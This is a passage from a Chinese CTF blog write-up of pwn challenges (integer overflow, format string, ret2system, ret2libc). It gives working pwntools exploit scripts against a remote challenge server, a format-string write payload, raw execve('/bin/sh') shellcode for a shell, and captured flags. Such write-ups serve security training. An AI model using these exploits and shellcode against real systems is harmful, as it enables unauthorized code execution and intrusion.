+<ul>
+<li>第一种</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">.plt:08048420                 jmp     ds:off_804A01C<br>.plt:08048420 _system         endp<br></code></pre></td></tr></table></figure>
+
+<p>对应的payload：</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-comment">(0x26 + 4)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(system_addr)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(0)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(bin_sh_addr)</span><br></code></pre></td></tr></table></figure>
+
+<p>对应栈帧分布：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[----------------------------------registers-----------------------------------]<br><span class="hljs-symbol">EAX:</span> <span class="hljs-number">0x56559000</span> --&gt; <span class="hljs-number">0x3efc</span> <br><span class="hljs-symbol">EBX:</span> <span class="hljs-number">0x56559000</span> --&gt; <span class="hljs-number">0x3efc</span> <br><span class="hljs-symbol">ECX:</span> <span class="hljs-number">0xffffd310</span> --&gt; <span class="hljs-number">0x1</span> <br><span class="hljs-symbol">EDX:</span> <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-symbol">ESI:</span> <span class="hljs-number">0xf7fa4000</span> --&gt; <span class="hljs-number">0x1d5d8c</span> <br><span class="hljs-symbol">EDI:</span> <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">EBP:</span> <span class="hljs-number">0xffffd2f8</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">ESP:</span> <span class="hljs-number">0xffffd2dc</span> --&gt; <span class="hljs-number">0x565561d3</span> (&lt;main+<span class="hljs-number">42</span>&gt;:	<span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span>)<br><span class="hljs-symbol">EIP:</span> <span class="hljs-number">0x56556046</span> (&lt;system@plt+<span class="hljs-number">6</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-number">0x0</span>)<br><span class="hljs-symbol">EFLAGS:</span> <span class="hljs-number">0x296</span> (carry PARITY ADJUST <span class="hljs-meta">zero</span> SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   <span class="hljs-number">0x5655603c</span>:	<span class="hljs-keyword">add</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">eax</span>],<span class="hljs-built_in">al</span><br>   <span class="hljs-number">0x5655603e</span>:	<span class="hljs-keyword">add</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">eax</span>],<span class="hljs-built_in">al</span><br>   <span class="hljs-number">0x56556040</span> &lt;system@plt&gt;:	<span class="hljs-keyword">jmp</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebx</span>+<span class="hljs-number">0xc</span>]<br>=&gt; <span class="hljs-number">0x56556046</span> &lt;system@plt+<span class="hljs-number">6</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x5655604b</span> &lt;system@plt+<span class="hljs-number">11</span>&gt;:	<span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x56556030</span><br>   <span class="hljs-number">0x56556050</span> &lt;__libc_start_main@plt&gt;:	<span class="hljs-keyword">jmp</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebx</span>+<span class="hljs-number">0x10</span>]<br>   <span class="hljs-number">0x56556056</span> &lt;__libc_start_main@plt+<span class="hljs-number">6</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-number">0x8</span><br>   <span class="hljs-number">0x5655605b</span> &lt;__libc_start_main@plt+<span class="hljs-number">11</span>&gt;:	<span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x56556030</span><br>[------------------------------------stack-------------------------------------]<br><span class="hljs-number">0000</span>| <span class="hljs-number">0xffffd2dc</span> --&gt; <span class="hljs-number">0x565561d3</span> (&lt;main+<span class="hljs-number">42</span>&gt;:	<span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span>)<br><span class="hljs-number">0004</span>| <span class="hljs-number">0xffffd2e0</span> --&gt; <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-number">0008</span>| <span class="hljs-number">0xffffd2e4</span> --&gt; <span class="hljs-number">0xffffd3a4</span> --&gt; <span class="hljs-number">0xffffd540</span> (<span class="hljs-string">&quot;/root/a.out&quot;</span>)<br><span class="hljs-number">0012</span>| <span class="hljs-number">0xffffd2e8</span> --&gt; <span class="hljs-number">0xffffd3ac</span> --&gt; <span class="hljs-number">0xffffd54c</span> (<span class="hljs-string">&quot;LANG=zh_CN.UTF-8&quot;</span>)<br><span class="hljs-number">0016</span>| <span class="hljs-number">0xffffd2ec</span> --&gt; <span class="hljs-number">0x565561bd</span> (&lt;main+<span class="hljs-number">20</span>&gt;:	<span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x2e43</span>)<br><span class="hljs-number">0020</span>| <span class="hljs-number">0xffffd2f0</span> --&gt; <span class="hljs-number">0xffffd310</span> --&gt; <span class="hljs-number">0x1</span> <br><span class="hljs-number">0024</span>| <span class="hljs-number">0xffffd2f4</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-number">0028</span>| <span class="hljs-number">0xffffd2f8</span> --&gt; <span class="hljs-number">0x0</span> <br>[------------------------------------------------------------------------------]<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>第二种</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:08048553                 mov     dword ptr [esp], offset command ; &quot;echo hehehe&quot;<br>.text:0804855A                 call    _system<br>.text:0804855F                 nop<br></code></pre></td></tr></table></figure>
+
+<p>对应的payload：</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-comment">(0x26 + 4)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(system_addr)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(bin_sh_addr)</span><br></code></pre></td></tr></table></figure>
+
+<p>对应栈帧分布情况：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[----------------------------------registers-----------------------------------]<br><span class="hljs-symbol">EAX:</span> <span class="hljs-number">0x56559000</span> --&gt; <span class="hljs-number">0x3efc</span> <br><span class="hljs-symbol">EBX:</span> <span class="hljs-number">0x56559000</span> --&gt; <span class="hljs-number">0x3efc</span> <br><span class="hljs-symbol">ECX:</span> <span class="hljs-number">0xffffd310</span> --&gt; <span class="hljs-number">0x1</span> <br><span class="hljs-symbol">EDX:</span> <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-symbol">ESI:</span> <span class="hljs-number">0xf7fa4000</span> --&gt; <span class="hljs-number">0x1d5d8c</span> <br><span class="hljs-symbol">EDI:</span> <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">EBP:</span> <span class="hljs-number">0xffffd2f8</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">ESP:</span> <span class="hljs-number">0xffffd2e0</span> --&gt; <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-symbol">EIP:</span> <span class="hljs-number">0x565561ce</span> (&lt;main+<span class="hljs-number">37</span>&gt;:	<span class="hljs-keyword">call</span>   <span class="hljs-number">0x56556040</span> &lt;system@plt&gt;)<br><span class="hljs-symbol">EFLAGS:</span> <span class="hljs-number">0x296</span> (carry PARITY ADJUST <span class="hljs-meta">zero</span> SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   <span class="hljs-number">0x565561c5</span> &lt;main+<span class="hljs-number">28</span>&gt;:	<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">edx</span>,[<span class="hljs-built_in">eax</span>-<span class="hljs-number">0x1ff8</span>]<br>   <span class="hljs-number">0x565561cb</span> &lt;main+<span class="hljs-number">34</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">edx</span><br>   <span class="hljs-number">0x565561cc</span> &lt;main+<span class="hljs-number">35</span>&gt;:	<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">eax</span><br>=&gt; <span class="hljs-number">0x565561ce</span> &lt;main+<span class="hljs-number">37</span>&gt;:	<span class="hljs-keyword">call</span>   <span class="hljs-number">0x56556040</span> &lt;system@plt&gt;<br>   <span class="hljs-number">0x565561d3</span> &lt;main+<span class="hljs-number">42</span>&gt;:	<span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span><br>   <span class="hljs-number">0x565561d6</span> &lt;main+<span class="hljs-number">45</span>&gt;:	<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x565561db</span> &lt;main+<span class="hljs-number">50</span>&gt;:	<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">esp</span>,[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8</span>]<br>   <span class="hljs-number">0x565561de</span> &lt;main+<span class="hljs-number">53</span>&gt;:	<span class="hljs-keyword">pop</span>    <span class="hljs-built_in">ecx</span><br>Guessed arguments:<br>arg[<span class="hljs-number">0</span>]: <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>[------------------------------------stack-------------------------------------]<br><span class="hljs-number">0000</span>| <span class="hljs-number">0xffffd2e0</span> --&gt; <span class="hljs-number">0x56557008</span> (<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-number">0004</span>| <span class="hljs-number">0xffffd2e4</span> --&gt; <span class="hljs-number">0xffffd3a4</span> --&gt; <span class="hljs-number">0xffffd540</span> (<span class="hljs-string">&quot;/root/a.out&quot;</span>)<br><span class="hljs-number">0008</span>| <span class="hljs-number">0xffffd2e8</span> --&gt; <span class="hljs-number">0xffffd3ac</span> --&gt; <span class="hljs-number">0xffffd54c</span> (<span class="hljs-string">&quot;LANG=zh_CN.UTF-8&quot;</span>)<br><span class="hljs-number">0012</span>| <span class="hljs-number">0xffffd2ec</span> --&gt; <span class="hljs-number">0x565561bd</span> (&lt;main+<span class="hljs-number">20</span>&gt;:	<span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x2e43</span>)<br><span class="hljs-number">0016</span>| <span class="hljs-number">0xffffd2f0</span> --&gt; <span class="hljs-number">0xffffd310</span> --&gt; <span class="hljs-number">0x1</span> <br><span class="hljs-number">0020</span>| <span class="hljs-number">0xffffd2f4</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-number">0024</span>| <span class="hljs-number">0xffffd2f8</span> --&gt; <span class="hljs-number">0x0</span> <br><span class="hljs-number">0028</span>| <span class="hljs-number">0xffffd2fc</span> --&gt; <span class="hljs-number">0xf7de79a1</span> (&lt;__libc_start_main+<span class="hljs-number">241</span>&gt;:	<span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span>)<br>[------------------------------------------------------------------------------]<br></code></pre></td></tr></table></figure>
+
+<p>总的来说就是两个system处于不同的函数栈帧中，所以一个payload需要多构造4个字节的padding来填充system返回地址，而另一个不需要。</p>
+<h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><p>整数溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">30567</span>)<br><br>cat_flag = <span class="hljs-number">0x08048694</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">24</span><br>payload += p32(cat_flag)<br>payload += <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">260</span> - <span class="hljs-number">24</span> - <span class="hljs-number">4</span>)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Your choice:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Please input your username:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;Hvnt3r&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Please input your passwd:&#x27;</span>)<br>io.sendline(payload)<br><br><span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-built_in">print</span>(io.recv())<br></code></pre></td></tr></table></figure>
+
+<p>flag</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">cyberpeace&#123;<span class="hljs-number">1</span>ca<span class="hljs-number">6</span>cd<span class="hljs-number">8943</span>a<span class="hljs-number">40</span>dc<span class="hljs-number">6698</span>ef<span class="hljs-number">90</span>a<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>f<span class="hljs-number">4</span><span class="hljs-keyword">cc</span><span class="hljs-number">6</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>格式化字符串漏洞，现实少见，比赛多见</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">unsigned __int64 sub_400BB9()<br>&#123;<br>  <span class="hljs-built_in">int</span> v1; // [rsp+4h] [rbp-7Ch]<br>  __int64 v2; // [rsp+8h] [rbp-78h]<br>  char <span class="hljs-built_in">format</span>; // [rsp+10h] [rbp-70h]<br>  unsigned __int64 v4; // [rsp+78h] [rbp-8h]<br><br>  v4 = __readfsqword(0x28u);<br>  v2 = 0LL;<br>  puts(<span class="hljs-string">&quot;You travel a short distance east.That&#x27;s odd, anyone disappear suddenly&quot;</span>);<br>  puts(<span class="hljs-string">&quot;, what happend?! You just travel , and find another hole&quot;</span>);<br>  puts(<span class="hljs-string">&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;</span>);<br>  puts(<span class="hljs-string">&quot;go into there(1), or leave(0)?:&quot;</span>);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">1</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;A voice heard in your mind&quot;</span>);<br>    puts(<span class="hljs-string">&quot;&#x27;Give me an address&#x27;&quot;</span>);<br>    _isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v2);<br>    puts(<span class="hljs-string">&quot;And, you wish is:&quot;</span>);<br>    _isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, &amp;<span class="hljs-built_in">format</span>);    &lt;====== Here<br>    puts(<span class="hljs-string">&quot;Your wish is&quot;</span>);<br>    printf(&amp;<span class="hljs-built_in">format</span>, &amp;<span class="hljs-built_in">format</span>);        &lt;====== Here<br>    puts(<span class="hljs-string">&quot;I hear it, I hear it....&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(0x28u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过<code>%x</code>看偏移，其实不用着这种方法也能知道，64位函数参数前六个参数再寄存器中，第7个参数在栈中，下面给出的<code>secret[0] is 11cc010</code>，通过<code>%x</code>确认偏移为7</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs applescript">we are wizard, we will give you hand, you can <span class="hljs-keyword">not</span> defeat dragon <span class="hljs-keyword">by</span> yourself ...<br>we will <span class="hljs-keyword">tell</span> you two secret ...<br>secret[<span class="hljs-number">0</span>] <span class="hljs-keyword">is</span> <span class="hljs-number">11</span>cc010<br>secret[<span class="hljs-number">1</span>] <span class="hljs-keyword">is</span> <span class="hljs-number">11</span>cc014<br>do <span class="hljs-keyword">not</span> <span class="hljs-keyword">tell</span> anyone <br>What should your <span class="hljs-built_in">character</span>&#x27;s <span class="hljs-built_in">name</span> be:<br>asd<br>Creating a new player.<br> This <span class="hljs-keyword">is</span> a famous <span class="hljs-keyword">but</span> quite unusual inn. The air <span class="hljs-keyword">is</span> fresh <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span><br>marble-tiled ground <span class="hljs-keyword">is</span> clean. Few rowdy guests can be seen, <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span><br>furniture looks undamaged <span class="hljs-keyword">by</span> brawls, which are very common <span class="hljs-keyword">in</span> other pubs<br>all <span class="hljs-keyword">around</span> <span class="hljs-keyword">the</span> world. The decoration looks extremely valuable <span class="hljs-keyword">and</span> would fit<br><span class="hljs-keyword">into</span> a palace, <span class="hljs-keyword">but</span> <span class="hljs-keyword">in</span> this city <span class="hljs-keyword">it</span>&#x27;s quite ordinary. In <span class="hljs-keyword">the</span> <span class="hljs-keyword">middle</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span><br>room are velvet covered chairs <span class="hljs-keyword">and</span> benches, which surround large oaken<br>tables. A large sign <span class="hljs-keyword">is</span> fixed <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> northern wall <span class="hljs-keyword">behind</span> a wooden bar. In<br>one corner you notice a fireplace.<br>There are two obvious exits: east, up.<br>But strange thing <span class="hljs-keyword">is</span> ,no one there.<br>So, <span class="hljs-keyword">where</span> you will go?east <span class="hljs-keyword">or</span> up?:<br>east<br>You travel a short distance east.That&#x27;s odd, anyone disappear suddenly<br>, what happend?! You just travel , <span class="hljs-keyword">and</span> find another hole<br>You recall, a big black hole will suckk you <span class="hljs-keyword">into</span> <span class="hljs-keyword">it</span>! Know what should you do?<br>go <span class="hljs-keyword">into</span> there(<span class="hljs-number">1</span>), <span class="hljs-keyword">or</span> leave(<span class="hljs-number">0</span>)?:<br><span class="hljs-number">1</span><br>A voice heard <span class="hljs-keyword">in</span> your mind<br>&#x27;Give <span class="hljs-keyword">me</span> an address&#x27;<br><span class="hljs-number">18661392</span><br>And, you wish <span class="hljs-keyword">is</span>:<br>%x.%x.%x.%x.%x.%x.%x.%x.%x.<br>Your wish <span class="hljs-keyword">is</span><br>ea3c76a3.ea3c8780.ea0f92c0.ea5ef700.ea5ef700<span class="hljs-number">.22</span><span class="hljs-number">.11</span>cc010<span class="hljs-number">.252e7825</span><span class="hljs-number">.2e78252</span>e.I hear <span class="hljs-keyword">it</span>, I hear <span class="hljs-keyword">it</span>....<br>Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!<br>Dragon <span class="hljs-built_in">say</span>: HaHa! you were supposed <span class="hljs-keyword">to</span> have a normal<br>RPG game, <span class="hljs-keyword">but</span> I have changed <span class="hljs-keyword">it</span>! you have no weapon <span class="hljs-keyword">and</span> <br>skill! you could <span class="hljs-keyword">not</span> defeat <span class="hljs-keyword">me</span> !<br>That&#x27;s sound terrible! you meet final boss!<span class="hljs-keyword">but</span> you level <span class="hljs-keyword">is</span> ONE!<br></code></pre></td></tr></table></figure>
+
+<p>而且这个题中有一个强制类型转换：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>);<br>v1 = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">33</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>read(<span class="hljs-number">0</span>, v1, <span class="hljs-number">0x100</span>uLL);<br>((<span class="hljs-type">void</span> (__fastcall *)(_QWORD, <span class="hljs-type">void</span> *))v1)(<span class="hljs-number">0LL</span>, v1);   &lt;====<br></code></pre></td></tr></table></figure>
+
+<p>用户输入会被直接执行，这里就放入shellcode。</p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">36839</span>)<br><br>io.recvuntil(<span class="hljs-string">&quot;secret[0] is &quot;</span>)<br>arr_addr = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>payload = asm(shellcraft.sh())<br>payload2 = <span class="hljs-string">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;What should your character\&#x27;s name be:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;hvnt3r&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;So, where you will go?east or up?:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;east&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;go into there(1), or leave(0)?:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;\&#x27;Give me an address\&#x27;&#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(arr_addr))<br>io.recvuntil(<span class="hljs-string">&#x27;And, you wish is:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;%85c%7$n&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Wizard: I will help you! USE YOU SPELL&#x27;</span>)<br>io.sendline(payload2)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>flag</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">cyberpeace&#123;e835aafd1184958de3f77<span class="hljs-number">27a97536540</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>ret2libc</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/193646.html">Pwntools之DynELF原理探究</a></p>
+<p>flag</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cyberpeace</span><span class="hljs-template-variable">&#123;a37050cd56a9dc4f19b4caff856ef86f&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<hr>
+<blockquote>
+<p>最近工作很忙真是抽不出时间更新博客呢🙃</p>
+</blockquote>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/PWN/">PWN</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Linux/">Linux</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">攻防世界PWN高手进阶区</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/08/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93-so%E7%9A%84%E7%94%9F%E6%88%90%E4%B8%8E%E4%BD%BF%E7%94%A8/">
+                        <span class="hidden-mobile">Linux动态链接库.so的生成与使用</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
